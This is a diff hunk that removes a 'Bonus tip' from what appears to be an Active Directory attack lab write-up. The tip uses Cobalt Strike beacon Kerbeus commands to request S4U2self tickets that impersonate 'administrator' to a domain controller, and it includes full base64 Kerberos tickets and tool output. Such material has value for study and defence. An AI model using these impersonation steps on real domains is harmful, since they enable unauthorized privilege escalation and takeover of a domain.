@@ -462,52 +462,6 @@ Contents of \\dc01\c$\*:
 	                                                     13 Dir(s)
 ```
 
-Bonus tip:
-
-
-if we want to know before swaping SPNs what is the ticket look like we can manually ask for s4u2self and get this TGS:
-```shell
-beacon> krb_s4u /service:cifs/dc01 /impersonateuser:administrator /ticket:doIE2jCCBNagAwIBBaEDAgEWooID6zCCA+dhggPjMIID36ADAgEFoQsbCUxPTC5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTE9MLkxPQ0FMo4IDqTCCA6WgAwIBEqEDAgECooIDlwSCA5OeWKoY647o7rF+DR+j/hYPyHlpdb5B5XDr8ucoF1f/CsZXKCjnWnEkBkRgZUqDtkgw7XOid2/UaJ4l4hyUqVjXA0Wvo2ICSr4jve/YXeWMPvvOCCGQzHdGmCQEcasWmbAuWFcMvgUtC/xpdMEEl7LYgO1DMdRxnfd7bxMC3ro+O1zfXQVM5O8FoCJkSvieWTwbxbxyvHX2HyF19GD+k1fXAZrL4y9P8MDt6+OzMxFMN43KDVgYHMj7TL3LoxqHXKKRJDb7ZlrXBK9DkCYQld68tNBHeo3guxsKFNcw50zWoE+ezwj8dDFjIAfWbeFri0xbFeYs7icW/kR4RfW4VKjQmOIVqbdctEOY/VuoB5BtCm/2KoJfn67xgAiPPum93ZC9tXH2B50kWMf/eblyG9iwFIwrW7Oh6fsEqnDzoAkF/xbuDUnMjUirTMoNlgsMfVAHBhFJlAB5jbkRAExdctys2r9X/e4QJHpH/ri0rg0bcJ1HJ3qgOojo+9k7DH0U6ph8Xkf8tynth67/Cp+06Gk6Omkdw3BUcHqfyrNqGvhEDbToFW0rxjNl5+jbFNdqjDJgxWzbMpnNngbn354gMg7TZLZp2sWPypANkhcxAkiH44VuoonBPWmBZ2/8wSzvdyWvG3SL/wBAWqtezfK+bwsDmcfRLOYlhRJhsiozULiV2rfmbh/ZBhX1GQejvvtlvGuRWMZldekS41WOT1LuvK4CZlPeyJynJQsekEkp6K2zpkcIskTzXNRdapt+StPVKu1SxpNghBE43BNPt+0DoAN2FEFf1cYb8w5KFsLHww7OjZvSkmN9ewXHBAv1hI4NH+j1BoXvIk6pCtjroYjFqFX8/pDKXYhQOvXPlJY2pjwWdBoDy4K91vo0vBTB0aiUsO5fkmEv3E942s5HhivPWYpKMsA20S/vxzzmNCiC7IlpI7SiRdLstGhX0DBoGA2CNVO92fY2IYgoOhjwm8lCc5CSAnq8rYX8FZhvj8cCOWqS9PYH6zccDX6nGfAwKR7EdyXjH7NX1DSgEMnf5YKECvbkevyMklwXa2i7dYYgasglGTHpEYDMGAl9Aty1fIZbQXLPbXkjx4FpunGl/EvMFWfDyFJK2XWg3kl4kGJXSedpkbJhMZdkFHKtVuudKqJPc4Xq/WQdi9XIEL9M+Y3hrTUplQELTeVHZ4LhaAuWbvEyviybZyhAS6QEitYK9mh4Ea1VjuKjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaArMCmgAwIBEqEiBCA/4Frv8Hwk/Uq2Oa7Pa57BQ8gePSBkn0UW1r3344jxM6ELGwlMT0wuTE9DQUyiEjAQoAMCAQGhCTAHGwVXUzAxJKMHAwUAQOEAAKURGA8yMDI2MDMzMDE2MDAyOVqmERgPMjAyNjAzMzEwMjAwMjlapxEYDzIwMjYwNDA2MTYwMDI5WqgLGwlMT0wuTE9DQUypHjAcoAMCAQKhFTATGwZrcmJ0Z3QbCUxPTC5MT0NBTA==
-[+] Kerbeus S4U by RalfHacker
-[+] host called home, sent: 69072 bytes
-[+] received output:
-[*] Action: S4U
-
-[*] Building S4U2self request for: 'WS01$@LOL.LOCAL'
-[+] S4U2self success!
-[*] Got a TGS for 'administrator' to 'WS01$@LOL.LOCAL'
-[*] base64(ticket.kirbi):
-
-doIFQjCCBT6gAwIBBaEDAgEWooIEVzCCBFNhggRPMIIES6ADAgEFoQsbCUxPTC5MT0NBTKISMBCgAwIBAaEJMAcbBVdTMDEko4IEITCCBB2gAwIBEqEDAgEFooIEDwSCBAuP0bZSLTvxT3Gqye5LFT+l0pqpNAIzL6dt0GimfbetWRsg2jaPePK/DhWqqdQ5bMSt7eYYVXlb/uSKpSScaHuL6Wc4kGKj82CLfMFG2/8UduEK08yWViVwRUQtYzFvBlaaDZ2fPrN/rsKVhRIExtjc4Na+AisTz+396d0fOhoHRnAvsPWyfwBDT9NzYvswmkWtwNXlTMOrsHnpunUYut4cf5I0fRVtpNJ/16VaoqyHaWHx0tYsiCRXi0p46l/ePMA7FzPGOOVIWUjdHl+MZV5FwvcQC8hK/m/mrE1TK+Psbs0R5vNf/vO1Sj1iPRyRNYecTvo7YFWjgl6OVOpDDknuGqUY44oE92UH5pvy0PxK08DCckdPw4AS1OnUvuOoVaDzJHC0Jv/t0J4NsM2c+xoBBOk4gtq1frcO0YyBspJpjWbl9g7Rf4nqw8bD1QXsh92/tRYWMt7uH31SwzXv75clpS6qS4k4qqSMy6d28E3RCyLksTdB5Mx0Zix2aGHS1lNMvztlRPiJEEf/0L7jpRrtp6dWd8jBTgp2VrvVyVssaB/Qn0tvvFs0lvgwICHKx9bY77EX7AKQtpVN3McwPIySKwaai4ynRHYFhJJeiJaYATJbkXWJUU8S8xzOG/3g4EKkTYGEg0Tjqgbae2kvpbBLZ6Vru9gMODo3UHItRM8gCr2/c6/BxEQTqUnG1PcHJvNYZHGfb/dHLWe0a1imR1oJUpunQzhcKOAZt2xHujjBvsNuPNrp2Uc5EmxfSs6Ep1fWjl+T3G+DxL8NxrztDdZWXPkrgpTBeoxdfB8LNSHCYmybpmvfwQHhNFDUJAt5BtEJOMJq8J/ig3k2QyhHDK0A6lzK94aTsIiM3AEP3w+UzejEF+NCJmdVaTc1XthL3fuwB3KX8TNS40LkGZE+Cd0n9mIIi+xl1EKJF98tpM8Egg8REC6Bh7srae7qyN7+qSe2bpGBRFD81rRMM5RgmHEq5+rGIg+B5LhW253VnDyAqBR9u5aXpeuj9T4YV68GtlWPSSSpGLTEI6uVuGl218CT2l1H+dTInIIXTcLm4Bz4Xu+NpDGRh9/G6XbI7pamSWYQKW2QGP5UAiJgFEcsUxxTXENwhBn8Gl/u1ROJLxtYe4eI5/1CaFlzvYWlbmZN5YznfNGe8sNahF18wH6cr5g/599R371Ysy2s+MT9My55c5tsgThOvf2nXoHaCzW5HjA/CS2Ya+2E5ew42biBVo9nMxP3oWRhy97Hll+Pt2xG9z79tCaS9/+KjXyJR2dwlIJRPyg/YbQGOf1bmy9Uq1Ik5WYLpp3M7w+BRhFclP1VLgVZJHOVk+eVjYb2ebfmidDHN6fyUlg+CSgAh8ylDUs+jFsH7hdWcwBG6ESjgdYwgdOgAwIBAKKBywSByH2BxTCBwqCBvzCBvDCBuaArMCmgAwIBEqEiBCA7SGLFHz7o9LwKGwksN76GQMmHN3zs36Ege8K70PjRCaELGwlMT0wuTE9DQUyiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQAApQAApREYDzIwMjYwMzMwMjAwMDI0WqYRGA8yMDI2MDMzMTAyMDAyOVqnERgPMjAyNjAzMzEyMDAwMjRaqAsbCUxPTC5MT0NBTKkSMBCgAwIBAaEJMAcbBVdTMDEk
-
-[*] Impersonating user 'administrator' to target SPN 'cifs/dc01'
-[*] Building S4U2proxy request for service: 'cifs/dc01'
-
-	[x] Kerberos error : 13
-```
-
-Then we can see how it looks, it will have the machine name `DC01$` in the ServiceName and the UserName is `administrator`:
-
-```shell
-beacon> krb_describe /ticket:doIFQjCCBT6gAwIBBaEDAgEWooIEVzCCBFNhggRPMIIES6ADAgEFoQsbCUxPTC5MT0NBTKISMBCgAwIBAaEJMAcbBVdTMDEko4IEITCCBB2gAwIBEqEDAgEFooIEDwSCBAuP0bZSLTvxT3Gqye5LFT+l0pqpNAIzL6dt0GimfbetWRsg2jaPePK/DhWqqdQ5bMSt7eYYVXlb/uSKpSScaHuL6Wc4kGKj82CLfMFG2/8UduEK08yWViVwRUQtYzFvBlaaDZ2fPrN/rsKVhRIExtjc4Na+AisTz+396d0fOhoHRnAvsPWyfwBDT9NzYvswmkWtwNXlTMOrsHnpunUYut4cf5I0fRVtpNJ/16VaoqyHaWHx0tYsiCRXi0p46l/ePMA7FzPGOOVIWUjdHl+MZV5FwvcQC8hK/m/mrE1TK+Psbs0R5vNf/vO1Sj1iPRyRNYecTvo7YFWjgl6OVOpDDknuGqUY44oE92UH5pvy0PxK08DCckdPw4AS1OnUvuOoVaDzJHC0Jv/t0J4NsM2c+xoBBOk4gtq1frcO0YyBspJpjWbl9g7Rf4nqw8bD1QXsh92/tRYWMt7uH31SwzXv75clpS6qS4k4qqSMy6d28E3RCyLksTdB5Mx0Zix2aGHS1lNMvztlRPiJEEf/0L7jpRrtp6dWd8jBTgp2VrvVyVssaB/Qn0tvvFs0lvgwICHKx9bY77EX7AKQtpVN3McwPIySKwaai4ynRHYFhJJeiJaYATJbkXWJUU8S8xzOG/3g4EKkTYGEg0Tjqgbae2kvpbBLZ6Vru9gMODo3UHItRM8gCr2/c6/BxEQTqUnG1PcHJvNYZHGfb/dHLWe0a1imR1oJUpunQzhcKOAZt2xHujjBvsNuPNrp2Uc5EmxfSs6Ep1fWjl+T3G+DxL8NxrztDdZWXPkrgpTBeoxdfB8LNSHCYmybpmvfwQHhNFDUJAt5BtEJOMJq8J/ig3k2QyhHDK0A6lzK94aTsIiM3AEP3w+UzejEF+NCJmdVaTc1XthL3fuwB3KX8TNS40LkGZE+Cd0n9mIIi+xl1EKJF98tpM8Egg8REC6Bh7srae7qyN7+qSe2bpGBRFD81rRMM5RgmHEq5+rGIg+B5LhW253VnDyAqBR9u5aXpeuj9T4YV68GtlWPSSSpGLTEI6uVuGl218CT2l1H+dTInIIXTcLm4Bz4Xu+NpDGRh9/G6XbI7pamSWYQKW2QGP5UAiJgFEcsUxxTXENwhBn8Gl/u1ROJLxtYe4eI5/1CaFlzvYWlbmZN5YznfNGe8sNahF18wH6cr5g/599R371Ysy2s+MT9My55c5tsgThOvf2nXoHaCzW5HjA/CS2Ya+2E5ew42biBVo9nMxP3oWRhy97Hll+Pt2xG9z79tCaS9/+KjXyJR2dwlIJRPyg/YbQGOf1bmy9Uq1Ik5WYLpp3M7w+BRhFclP1VLgVZJHOVk+eVjYb2ebfmidDHN6fyUlg+CSgAh8ylDUs+jFsH7hdWcwBG6ESjgdYwgdOgAwIBAKKBywSByH2BxTCBwqCBvzCBvDCBuaArMCmgAwIBEqEiBCA7SGLFHz7o9LwKGwksN76GQMmHN3zs36Ege8K70PjRCaELGwlMT0wuTE9DQUyiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQAApQAApREYDzIwMjYwMzMwMjAwMDI0WqYRGA8yMDI2MDMzMTAyMDAyOVqnERgPMjAyNjAzMzEyMDAwMjRaqAsbCUxPTC5MT0NBTKkSMBCgAwIBAaEJMAcbBVdTMDEk
-[+] Kerbeus DESCRIBE by RalfHacker
-[+] host called home, sent: 24792 bytes
-[+] received output:
-[*] Action: Describe ticket
-
-  ServiceName              :  WS01$
-  ServiceRealm             :  LOL.LOCAL
-  UserName                 :  administrator
-  UserRealm                :  LOL.LOCAL
-  StartTime (UTC)          :  30.03.2026 20:0:24
-  EndTime (UTC)            :  31.03.2026 2:0:29
-  RenewTill (UTC)          :  31.03.2026 20:0:24
-  Flags                    :  renewable pre_authent ok_as_delegate enc_pa_rep 
-  KeyType                  :  aes256_cts_hmac_sha1
-```
-
-What Rubeus did was changing the `WS01$` from service name and put `cifs/dc01`
-
 ---
 
 
